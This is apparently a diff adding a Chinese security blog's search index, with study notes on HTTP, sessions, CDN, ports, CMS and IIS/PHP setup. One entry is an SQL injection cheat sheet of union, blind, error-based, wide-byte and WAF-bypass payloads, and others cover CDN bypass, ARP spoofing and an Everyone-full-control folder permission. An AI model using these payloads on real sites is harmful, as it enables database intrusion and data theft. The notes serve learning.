@@ -1,0 +1,209 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>网安基础总结 六</title>
+      <link href="2020/09/25/wang-an-ji-chu-zong-jie-6/"/>
+      <url>2020/09/25/wang-an-ji-chu-zong-jie-6/</url>
+      
+        <content type="html"><![CDATA[<h5 id="HTTP-HyperText-Transfer-Protocol"><a href="#HTTP-HyperText-Transfer-Protocol" class="headerlink" title="HTTP  HyperText Transfer Protocol"></a>HTTP  <em>HyperText Transfer Protocol</em></h5><ul><li>HTTP详细规定了浏览器和万维网服务器之间的通信规则,是万维网交换信息的基础。</li><li>HTTP遵循 请求/响应模型，web浏览器向web服务器发送请求，web服务器处理请求并返回适当响应。<h5 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h5></li><li>统一资源定位符，是一种特殊的URI（统一资源标识符），用来识别互联网某一处资源的地址。</li><li>URL的标准格式为：协议://服务器域名[:端口]/路径[?查询]   <strong><em>方括号内为可选项</em></strong></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安预备基础 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> HTTP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网安基础总结 五</title>
+      <link href="2020/09/22/wang-an-ji-chu-zong-jie-5/"/>
+      <url>2020/09/22/wang-an-ji-chu-zong-jie-5/</url>
+      
+        <content type="html"><![CDATA[<h3 id="COOKIE和SESSION"><a href="#COOKIE和SESSION" class="headerlink" title="COOKIE和SESSION"></a>COOKIE和SESSION</h3><h5 id="什么是COOKIE"><a href="#什么是COOKIE" class="headerlink" title="什么是COOKIE"></a>什么是COOKIE</h5><p>Cookie是保存在浏览器上的一些数据，一般通过HTTP响应头set cookie来设置，当然也可以通过JS脚本来直接设置，Cookie是按照网站来进行组织和保存的，每一个网站都可以在浏览器中保存一些Cookie，保存好了之后，浏览器向这个网站发出的请求都会携带这些Cookie，然后后台就可以分析这些Cookie。<br>也就说Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</p><h5 id="什么是SESSION"><a href="#什么是SESSION" class="headerlink" title="什么是SESSION"></a>什么是SESSION</h5><p>本来 session 是一个抽象概念，开发者为了实现中断和继续等操作，将 user agent 和 server 之间一对一的交互，抽象为“会话”，进而衍生出“会话状态”，也就是 session 的概念。session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；而我们今天常说的 “session”，是为了绕开 cookie 的各种限制，通常借助 cookie 本身和后端存储实现的，一种更高级的会话状态实现。</p><ul><li>所以 cookie 和 session，既可以说是同一层次的概念，也可以说是不同层次的概念。具体到实现机制，session 因为 session id 的存在，通常要借助 cookie 实现，但这并非必要，只能说是通用性较好的一种方案。</li></ul><h6 id="SESSION的三种传输方式"><a href="#SESSION的三种传输方式" class="headerlink" title="SESSION的三种传输方式"></a>SESSION的三种传输方式</h6><ul><li>通过cookie实现传输</li><li>通过重写URL实现传输</li><li>通过表单隐藏字段实现传输</li></ul><h5 id="COOKIE和SESSION-1"><a href="#COOKIE和SESSION-1" class="headerlink" title="COOKIE和SESSION"></a>COOKIE和SESSION</h5><ol><li>由于HTTP协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是Session。典型的应用场景就是购物车，当你点击下单按钮时，由于HTTP协议无状态，所以并不知道是哪个用户操作的，所以服务端要为特定的用户创建特定的Session，用于标识这个用户，并且跟踪用户的行为，这样才知道购物车里面有什么商品。这个Session是保存在服务端的，具有唯一性。在服务端保存Session的方法很多，内存、数据库、文件都有。集群的时候也要考虑Session的转移，在大型的网站，一般会有专门的Session服务器集群，用来保存用户会话，这个时候 Session 信息都是放在内存的，使用一些缓存服务比如Memcached之类的来放 Session。</li><li>当服务端需要识别特定的用户时，Cookie就登场了。每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是通过Cookie 来实现Session跟踪的：当第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在 Cookie 里面记录一个Session ID，即在cookie中包含session字段，以后每次请求时把这个包含 Session ID的 Cookie 发送到服务器，服务器就可以分辨客户端了。当客户端的浏览器禁用了 Cookie 时，一般这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次HTTP交互，URL后面都会被附加上一个诸如 sid=xxxxx 这样的参数，服务端据此来识别用户，这就是session实现的另一种方式,但这种方式有一个缺陷就是不能够跨窗口使用，当你新开了一个浏览器窗口进入相同页面时，系统会赋予你一个新的sessionid，这样信息共享的目的就达不到了。而将session ID写入Cookie就能实现跨窗口跟踪。</li><li>Cookie其实还可以用在一些方便用户的场景下，例如你某次登陆过一个网站，下次登录的时候不想再次输入账号了，怎么办？你的登录信息可以写到Cookie里面，访问网站的时候，网站页面的脚本可以读取这个信息，就自动帮你把用户名给填了，能够方便一下用户。这也是Cookie名称的由来，给用户的一点甜头。</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安预备基础 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web基础知识 </tag>
+            
+            <tag> HTTP基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网安基础总结 四</title>
+      <link href="2020/09/22/wang-an-ji-chu-zong-jie-4/"/>
+      <url>2020/09/22/wang-an-ji-chu-zong-jie-4/</url>
+      
+        <content type="html"><![CDATA[<h5 id="CND原理"><a href="#CND原理" class="headerlink" title="CND原理"></a>CND原理</h5><p>全称:Content Delivery Network或Content Ddistribute Network，即<strong>内容分发网络</strong></p><p>CDN简单来说就是一个部署在客户端和服务器之间的缓存服务器，客户端访问是服务器时先经过CDN，如果CND拥有客户端请求资源的缓存，则直接将资源返回给客户端，否则CDN就向服务器请求资源下发给客户端。</p><ul><li><p><strong>基本思路：</strong><br>尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过部署在网络各处节点服务器，构成在现有的互联网基础之上的一层智能虚拟网络，CDN系统可以实现实时地根据网络流量和各节点的连接数、负载状况、到用户的距离以及响应时间等综合信息将用户的请求重新导向对于用户最优的服务节点上。</p></li><li><p><strong>目的：</strong><br>解决因地理分布、带宽、服务器性能等条件限制带来的访问延迟问题，适用于站点加速、点播、直播等场景。使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度和成功率。</p></li></ul><h5 id="内容分发过程"><a href="#内容分发过程" class="headerlink" title="内容分发过程"></a>内容分发过程</h5><ul><li>基础架构：最简单的CDN网络由一个DNS服务器和几台缓存服务器组成：<br><img src="./1.jpg" alt></li><li>1.当用户点击网站页面上的内容URL，经过本地DNS系统解析，DNS系统会最终将域名的解析权交给CNAME指向的CDN专用DNS服务器。</li><li>2.CDN的DNS服务器将CDN的全局负载均衡设备IP地址返回用户。</li><li>3.用户向CDN的全局负载均衡设备发起内容URL访问请求。</li><li>4.CDN全局负载均衡设备根据用户IP地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。</li><li>5.区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括：根据用户IP地址，判断哪一台服务器距用户最近；根据用户所请求的URL中携带的内容名称，判断哪一台服务器上有用户所需内容；查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的IP地址。</li><li>6.全局负载均衡设备把服务器的IP地址返回给用户。</li><li>7.用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。</li></ul><h5 id="CDN判断及绕过"><a href="#CDN判断及绕过" class="headerlink" title="CDN判断及绕过"></a>CDN判断及绕过</h5><h6 id="CDN判断方法"><a href="#CDN判断方法" class="headerlink" title="CDN判断方法"></a>CDN判断方法</h6><ul><li>1.利用CDN就近分发内容的原理，采用多地ping同一网站的方法，如果解析到多个IP地址则为CDN</li><li>2.使用域名解析的手段,如nslookup,如果解析到多个IP则为CDN<h6 id="绕过CDN获取真实IP"><a href="#绕过CDN获取真实IP" class="headerlink" title="绕过CDN获取真实IP"></a>绕过CDN获取真实IP</h6></li><li>1.查询域名的历史解析记录</li><li>2.查询旁站的IP</li><li>3.利用国外主机进行访问</li><li>4.利用相关漏洞如SSRF、XSS盲打、命令执行等使服务器发起主动连接</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安预备基础 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web基础知识 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网安基础总结 三</title>
+      <link href="2020/09/21/wang-an-ji-chu-zong-jie-3/"/>
+      <url>2020/09/21/wang-an-ji-chu-zong-jie-3/</url>
+      
+        <content type="html"><![CDATA[<h4 id="什么是CMS"><a href="#什么是CMS" class="headerlink" title="什么是CMS"></a>什么是CMS</h4><ul><li>CMS即<strong>内容管理系统</strong>。使用CMS的主要目的是管理网站的内容。它包含可轻松管理Web应用程序的功能。</li><li>CMS有助于执行各种操作。用户可以轻松设置布局格式，添加，修改和删除内容。允许发布网页，创建新主题，使用现有主题，建立索引和搜索。<br>CMS也可以使用插件或扩展来进一步扩展应用程序。还可以添加不同的多媒体文件，例如图像，视频和音频，以使网页更具呈现性。此外，用户可以<br>使用CMS创建多语言网站。一些常见和流行的CMS如Drupal，WordPress和Joomla。由于它们的简单性和易用性，它们在社区中非常受欢迎。</li></ul><h4 id="什么是框架？"><a href="#什么是框架？" class="headerlink" title="什么是框架？"></a>什么是框架？</h4><ul><li>框架可以分为端框架和后端框架</li><li>框架提供了<strong>构建和部署应用程序的标准方法</strong>。它包含具有通用功能的通用代码,即代码可以复用。开发人员可以根据应用程序的需求进行修改和二次开发。<br>使用框架也有很多优点。框架提供了组织代码的方法,它还提高了代码的可重用性。由于软件需求可能随时更改，但使用框架开发的应用很容易进行修改。框架还提<br>供了预先构建和预先测试的工具。框架具有许多组件/部门。使开发人员可以更轻松地处理项目的各个方面。</li><li>此外，软件框架可以包括支持程序，编译器，代码库，工具以及应用程序编程接口（API）。行业中有许多框架。例如，CakePHP和CodeIgniter是用于构建动态网<br>页的开源Web框架。它们是用PHP编写的。另一方面，Django和Flask是两个用Python编写的框架。</li></ul><h4 id="CMS和框架之间的区别"><a href="#CMS和框架之间的区别" class="headerlink" title="CMS和框架之间的区别"></a>CMS和框架之间的区别</h4><ul><li>CMS和框架之间的主要区别在于，CMS是<strong>创建和管理数字内容的应用程序</strong>，而框架是包含<strong>通用功能的软件</strong>，可以根据应用程序通过其他用户编写的代码对其进行修改。</li><li>CMS和框架都是开发应用程序的软件程序。 CMS是一种内容管理系统，而框架是可重用的环境，是较大软件平台的一部分。</li></ul><h4 id="CMS和框架之间是什么关系"><a href="#CMS和框架之间是什么关系" class="headerlink" title="CMS和框架之间是什么关系"></a>CMS和框架之间是什么关系</h4><ul><li>CMS建立在框架上。</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安预备基础 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web基础知识 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网安基础总结 二</title>
+      <link href="2020/09/19/wang-an-ji-chu-zong-jie-2/"/>
+      <url>2020/09/19/wang-an-ji-chu-zong-jie-2/</url>
+      
+        <content type="html"><![CDATA[<h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>注：以下特指软件端口，硬件端口（接口）本文不做详解<br>端口，又称为连接端口、端口、协议端口在电脑网络中是一种经由软件创建的服务，在一个电脑操作系统中扮演通信的端点。每个端口都会与主机的IP地址及通信协议关联。端口以16比特数字来表示，这被称为端口编号（故端口共有2^16=65536个,范围为0~65535）。 位于传输层的通信协议通常需要指定端口号，例如在TCP/IP协议族之下的TCP与UDP协议。</p><h4 id="常见服务及对应端口"><a href="#常见服务及对应端口" class="headerlink" title="常见服务及对应端口"></a>常见服务及对应端口</h4><table><thead><tr><th align="center">HTTP</th><th align="center">HTTPS</th><th align="center">SSH</th><th align="center">DNS</th><th align="center">Telnet</th><th align="center">FTP</th><th align="center">POP3</th><th align="center">RDP</th><th align="center">SMB</th><th align="center">Mysql</th></tr></thead><tbody><tr><td align="center">80</td><td align="center">443</td><td align="center">22</td><td align="center">53</td><td align="center">23</td><td align="center">20/21</td><td align="center">110</td><td align="center">3389</td><td align="center">445</td><td align="center">3306</td></tr></tbody></table><ul><li>协议<br>&nbsp;网络协议指的是计算机网络中互相通信的对等实体之间交换信息时所必须遵守的规则的集合。<br>&nbsp;&nbsp;对等实体通常是指计算机网络体系结构中处于相同层次的信息单元。一般系统网络协议包括五个部分：<br>&nbsp;&nbsp;通信环境，传输服务，词汇表，信息的编码格式，时序、规则和过程。</li><li>网络协议三要素<br>&nbsp;&nbsp;一个网络协议至少包括三要素:<br>&nbsp;&nbsp;语法：用来规定信息格式;数据及控制信息的格式、编码及信号电平等。<br>&nbsp;&nbsp;语义：用来说明通信双方应当怎么做;用于协调与差错处理的控制信息。<br>&nbsp;&nbsp;规则：(时序)定义了何时进行通信，先讲什么，后讲什么，讲话的速度等。 比如是采用同步传输还是异步传输</li></ul><p><em>在不同的网络结构体系中，同一协议可能属于不同层次。</em><br><img src="./1.png" alt></p><ul><li><strong>注在TCP/IP协议栈中，数据链路层和物理层合称的网络接口层，图中为了方便表述而将其分开。</strong></li></ul><h4 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h4><ul><li><p><strong>DNS解析过程（DNS端口 ：TCP53  UDP53）</strong></p></li><li><p>客户机域名请求解析顺序<br>&nbsp;&nbsp;&nbsp;DNS缓存–&gt;本地host文件–&gt;DNS服务器</p></li><li><p><strong><em>DNS服务器的两种请求方式</em></strong><br><img src="./2.png" alt="递归查询"><br><img src="./3.png" alt="迭代查询"></p></li><li><p>处理域名解析请求顺序<br>DNS高速缓存–&gt;本地区域解析文件–&gt;转发器–&gt;根</p></li><li><p><strong>DNS劫持的攻击点是在DNS服务器上，把目标网站域名解析到错误的IP地址从而实现用户无法访问目标网站的目的或者蓄意或恶意要求用户访问指定IP地址（网站）的目的。</strong></p></li></ul><h4 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h4><ul><li>ARP攻击主要是通过伪造IP地址和MAC地址进行欺骗。（大量发送假的APR数据包，使交换机的ARP缓存表出错）</li><li>&nbsp;&nbsp;交换网络的嗅探<br>假设有台主机C、D、E、位于同一个交换式局域网中，监听者主机为C，而主机D、E正在进行通信，C希望能嗅探到D与E之间的通信数据，于是C就可以伪装成D对E做ARP欺骗，向E发送伪造的ARP应答包，在这个伪造的应答包中，IP地址为D的IP地址，而MAC地址为C的MAC地址：E在接收到这个应答包后，会刷新它的ARP缓存，这样在E的ARP缓存表中就出现了D的IP地址对应的是C的MAC地址，说详细点，就是让E认为D的IP地址映射到的MAC地址为主机C的MAC地址，这样，E想要发送给D的数据实际上却发送给了C，C再将数据包转发给D，这样C就成为了D与E的中间代理人，就达到了嗅探的目的。黑客就可以利用这种手段盗取网络上的重要信息。<br><img src="./4.png" alt></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安预备基础 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 扫盲 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入总结</title>
+      <link href="2020/09/17/sql-zhu-ru-zong-jie/"/>
+      <url>2020/09/17/sql-zhu-ru-zong-jie/</url>
+      
+        <content type="html"><![CDATA[<h3 id="0x01-什么是SQL注入"><a href="#0x01-什么是SQL注入" class="headerlink" title="0x01 什么是SQL注入"></a>0x01 什么是SQL注入</h3><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p><h3 id="0x02-SQL注入的分类"><a href="#0x02-SQL注入的分类" class="headerlink" title="0x02 SQL注入的分类"></a>0x02 SQL注入的分类</h3><h6 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a><strong>按变量类型分</strong></h6><p><em>数字型</em><br><em>字符型</em></p><h6 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a><strong>按HTTP提交方式分</strong></h6><p><em>GET注入</em><br><em>POST注入</em><br><em>Cookie注入</em></p><h6 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a><strong>按注入方式分</strong></h6><p><em>报错注入</em><br><em>盲注</em><br><em>布尔盲注</em><br><em>时间盲注</em><br><em>union注入</em><br><em>编码问题</em><br><em>宽字节注入</em></p><h3 id="0x03识别后台数据库"><a href="#0x03识别后台数据库" class="headerlink" title="0x03识别后台数据库"></a>0x03识别后台数据库</h3><h6 id="根据操作系统平台"><a href="#根据操作系统平台" class="headerlink" title="根据操作系统平台"></a>根据操作系统平台</h6><p>sql server：Windows(IIS)</p><p>MySQL：Apache</p><h6 id="根据web语言"><a href="#根据web语言" class="headerlink" title="根据web语言"></a>根据web语言</h6><p>Microsoft SQL Server：ASP和.Net</p><p>MySQL：PHP</p><p>Oracle/MySQL：java</p><h3 id="0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别"><a href="#0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别" class="headerlink" title="0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别"></a>0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别</h3><ul><li>(以下是对mysql数据库的总结，其他类型数据库会不定时更新)</li><li>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库–INFORMATION_SCHEMA ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 而5.0以下没有。</li></ul><p><strong><em>information_schema</em></strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p><p><strong><em>SCHEMATA</em></strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p><p><strong><em>TABLES</em></strong></p><p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><p><strong><em>COLUMNS</em></strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><h3 id="0x05-基本手工注入流程"><a href="#0x05-基本手工注入流程" class="headerlink" title="0x05 基本手工注入流程"></a>0x05 基本手工注入流程</h3><pre><code>* 要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。**1.MySQL &gt;= 5.0**1.获取字段数    order by n (通过不断尝试改变n的值来观察页面反应确定字段数)2.获取系统数据库名    在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中    select null,null,schema_name from information_schema.schemata3.获取当前数据库名    select null,null,...,database()4.获取数据库中的表    select null,null,...,group_concat(table_name) from information_schema.tables where     table_schema=database()    或select null,null,...,table_name from information_schema.tables where     table_schema=database() limit 0,15.获取表中的字段    这里假设已经获取到表名为user    select null,null,...,group_concat(column_name) from information_schema.columns where     table_schema=database() and table_name=&#39;users&#39;6.获取各个字段值    这里假设已经获取到表名为user，且字段为username和password    select null,group_concat(username,password) from users**2.MySQL &lt; 5.0**MySQL &lt; 5.0 没有信息数据库information_schema，所以只能手工枚举爆破(二分法思想)。(该方式通常用于盲注。)*相关函数*    length(str) ：返回字符串str的长度    substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，    不是数组的0开始    mid(str,pos,len) ：跟上面的一样，截取字符串    ascii(str) ：返回字符串str的最左面字符的ASCII代码值    ord(str) ：将字符或布尔类型转成ascll码    if(a,b,c) ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回01.基于布尔的盲注    and ascii(substr((select database()),1,1))&gt;64 /*判断数据库名的第一个字符的ascii值是否大于64*/2.基于时间的盲注    id=1 union select if(SUBSTRING(user(),1,4)=&#39;root&#39;,sleep(4),1),null,null     /*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/</code></pre><h3 id="0x06-常用注入方式"><a href="#0x06-常用注入方式" class="headerlink" title="0x06 常用注入方式"></a>0x06 常用注入方式</h3><pre><code>注释符：    #    -- (有空格)或--+    /**/内联注释：    /*！...*/union注入    id =-1 union select 1,2,3   /*获取字段*/Boolean注入    id=1&#39; substr(database(),1,1)=&#39;t&#39;--+     /*判断数据名长度*/报错注入    1 floor()和rand()        union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a         from information_schema.tables group by a               /*利用错误信息得到当前数据库名*/    2 extractvalue()        id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))    3 updatexml()        id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))    4 geometrycollection()        id=1 and geometrycollection((select * from(select * from(select user())a)b))    5 multipoint()        id=1 and multipoint((select * from(select * from(select user())a)b))    6 polygon()        id=1 and polygon((select * from(select * from(select user())a)b))    7 multipolygon()        id=1 and multipolygon((select * from(select * from(select user())a)b))    8 linestring()        id=1 and linestring((select * from(select * from(select user())a)b))    9 multilinestring()        id=1 and multilinestring((select * from(select * from(select user())a)b))    10 exp()    id=1 and exp(~(select * from(select user())a))时间注入    id = 1 and if(length(database())&gt;1,sleep(5),1)堆叠查询注入    id = 1&#39;;select if(sub(user(),1,1)=&#39;r&#39;,sleep(3),1)%23二次注入    假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username=test&#39;，接下来访问    xxx.php?username=test&#39;，页面返回id=22；    接下来再次发起请求xxx.php?id=22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。    访问xxx.php?id=test&#39; union select 1,user(),3%23，获得新的id=40，得到user()的结果，利用这种    注入方式会得到数据库中的值。宽字节注入    *利用条件*        [ ] 查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用        addslashes()或其过滤函数        [ ] 数据库的编码为GBK    *利用方式*        id = -1%DF&#39; union select 1,user(),3,%23    在上述条件下，单引号&#39;被转义为%5c，所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，    所以单引号成功逃逸。Cookie注入    当发现在url中没有请求参数，但是却能得到结果的时候，可以看看请求参数是不是在cookie中，然后利用常规    注入方式在cookie中注入测试即可，只是注入的位置在cookie中，与url中的注入没有区别。    Eg：Cookie: id = 1 and 1=1base64注入    对参数进行base64编码，再发送请求。    说明：id=1&#39;，1的base64编码为MSc=，而=的url编码为%3d，所以得到以下结果：    id=MSc%3dXFF注入    XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址    X-Forward-For：127.0.0.1&#39; select 1,2,user()</code></pre><h3 id="0x07-SQL注入绕过技术"><a href="#0x07-SQL注入绕过技术" class="headerlink" title="0x07 SQL注入绕过技术"></a>0x07 SQL注入绕过技术</h3><pre><code>大小写绕过双写绕过编码绕过(url全编码、十六进制)内联注释绕过关键字替换逗号绕过在substr、mid()函数中可以利用from to来摆脱对逗号的利用；在 limit中可以利用offset来摆脱对逗号的利用比较符号( &gt;、&lt; )绕过(greatest、between and)逻辑符号的替换(and=&amp;&amp; or=|| xor=| not=!)空格绕过(用括号，+等绕过)等价函数绕过    hex()、bin()=ascii()    concat_ws()=group_concat()    mid()、substr()=substring()http参数污染    (id=1 union select+1,2,3+from+users+where+id=1–变为id=1 union     select+1&amp;id=2,3+from+users+where+id=1–)缓冲区溢出绕过    (id=1 and select 1)=(select 0xAAAAAAAAAAAAAAA)+UnIoN+SeLecT+1,2,version(),4,5,database(),user(),    8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36--+      (其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> WEB基础漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL inject </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IIS+MySQL+PHP环境搭建</title>
+      <link href="2020/09/15/iis-mysql-php/"/>
+      <url>2020/09/15/iis-mysql-php/</url>
+      
+        <content type="html"><![CDATA[<h2 id="windows-server-2016下搭建IIS-PHP-MySQL"><a href="#windows-server-2016下搭建IIS-PHP-MySQL" class="headerlink" title="windows server 2016下搭建IIS+PHP+MySQL"></a>windows server 2016下搭建IIS+PHP+MySQL</h2><p>在安装IIS时在默认选项中额外勾选CGI<br><img src="./1.png" alt></p><p>下载NTS版本的PHP，注意是否有相应的VC运行库<br><img src="./2.png" alt><br>对PHP环境进行配置（修改PHP.ini）</p><p>1.解压文件，将php文件夹中的php.ini-development文件进行备份（修改文件前备份是个好习惯）<br>2.记事本打开php.ini-development文件，修改为对应时区，date.timezone =”Asia/Shanghai”，注意去掉前面的分号“;”。<br>3.激活你想要的扩展选项，即将相应dll语句前的分号“;”删除；由于是PHP+MySQL环境，推荐激活 gd2、mbstring、mysqli、pdo_mysql<br>4.保存为php.ini<br><img src="./3.png" alt></p><p>IIS配置PHP<br>打开IIS管理器，选择处理程序映射（Handler Mappings）<br><img src="./4.png" alt></p><p>选择右边的添加模块映射<br><img src="./5.png" alt></p><p>填写对应选项<br><img src="./6.png" alt></p><p>验证<br>在网站目录下添加index.php文件，在文件中写入<?php phpinfo(); ?>。</p><p>在默认文档下添加index.php<br><img src="./7.png" alt><br>访问localhost<br><img src="./8.png" alt></p><p>下载安装Windows版MySQL<br>关于此项请移步<a href="https://blog.csdn.net/u014416239/article/details/52446608" target="_blank" rel="noopener">https://blog.csdn.net/u014416239/article/details/52446608</a><br>或者<a href="www.baidu.com">百度</a>搜索 Windows下安装MySQL</p><p>基于PHP的CMS部署<br>将CMS解压（以解压到C盘根目录为例）<br><img src="./9.png" alt><br>给文件夹设置权限，方便起见，这里添加Everyone用户并赋予完全控制 权限（其实应该是给IUSR 用户赋予相关权限）<br><img src="./10.png" alt></p><p>在IIS管理器中添加网站，填入相关内容<br><img src="./11.png" alt></p><p>有闲心的话可以在默认文档中添加index.php作为默认首页<br><img src="./12.png" alt></p><p>打开127.0.0.1:[设置的端口] 访问网站,根据CMS的引导完成CMS的部署</p><p>最终结果<br><img src="./13.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安预备基础 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网安基础总结 一</title>
+      <link href="2020/09/14/wang-an-ji-chu-zong-jie-1/"/>
+      <url>2020/09/14/wang-an-ji-chu-zong-jie-1/</url>
+      
+        <content type="html"><![CDATA[<h4 id="PC与服务器的区别"><a href="#PC与服务器的区别" class="headerlink" title="PC与服务器的区别"></a>PC与服务器的区别</h4><p>服务器侧重于稳定性及多线程，PC侧重用户体验和通用性</p><h4 id="服务器端常见操作系统"><a href="#服务器端常见操作系统" class="headerlink" title="服务器端常见操作系统"></a>服务器端常见操作系统</h4><h5 id="Window："><a href="#Window：" class="headerlink" title="Window："></a>Window：</h5><ul><li>Windows2003</li><li>Windows2008</li><li>Windows2012</li><li>Windows2016</li><li>Windows2019<h5 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h5></li><li>CentOS</li><li>Ubuntu</li><li>RedHat</li><li>Debian</li></ul><h4 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h4><p>web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如JAVA中的Tomcat容器，ASP的IIS或PWS都是这样的容器。一个服务器可以有多个容器。</p><ul><li>IIS</li><li>Apache</li><li>Nginx</li><li>Tomcat</li><li>Weblogic<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4></li><li>Access</li><li>SQLserver（MSsql）</li><li>Mysql</li><li>Oracle</li><li>Redis</li><li>Mongodb<h5 id="数据库结构简述"><a href="#数据库结构简述" class="headerlink" title="数据库结构简述"></a>数据库结构简述</h5></li></ul><ul><li>库、表、列、值<br>Eg:<img src="./2.png" alt></li></ul><h4 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h4><ul><li>ASP</li><li>ASPX(ASP.NET)</li><li>JSP</li><li>PHP<h4 id="常见容器、数据库、脚本语言搭配"><a href="#常见容器、数据库、脚本语言搭配" class="headerlink" title="常见容器、数据库、脚本语言搭配"></a>常见容器、数据库、脚本语言搭配</h4><table><thead><tr><th align="center">容器</th><th align="center">数据库</th><th align="center">脚本语言</th></tr></thead><tbody><tr><td align="center">IIS</td><td align="center">ACCESS/MSSQL</td><td align="center">ASP/ASPX</td></tr><tr><td align="center">Apache/Nginx</td><td align="center">MySQL</td><td align="center">PHP</td></tr><tr><td align="center">Tomcat</td><td align="center">JSP</td><td align="center">MySQL/Oracle</td></tr></tbody></table></li></ul><ul><li>注:之上关系并非固定标准,而是一种民间的默认。</li></ul><h4 id="关于web服务器、中间件、web容器的辨析"><a href="#关于web服务器、中间件、web容器的辨析" class="headerlink" 